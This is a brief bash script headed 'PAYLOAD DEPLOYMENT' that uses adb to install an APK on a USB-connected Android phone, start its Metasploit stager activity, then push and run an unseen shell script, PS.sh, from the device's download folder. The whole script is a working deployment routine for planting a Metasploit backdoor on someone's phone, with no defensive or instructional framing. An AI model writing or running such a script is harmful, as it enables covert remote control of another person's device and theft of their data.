#!/bin/bash

echo *PAYLOAD DEPLOYMENT*

sleep 2

adb -d install OP_ADB.apk
adb -d shell am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
adb -d push PS.sh /sdcard/download
adb -d shell sh /sdcard/download/PS.sh

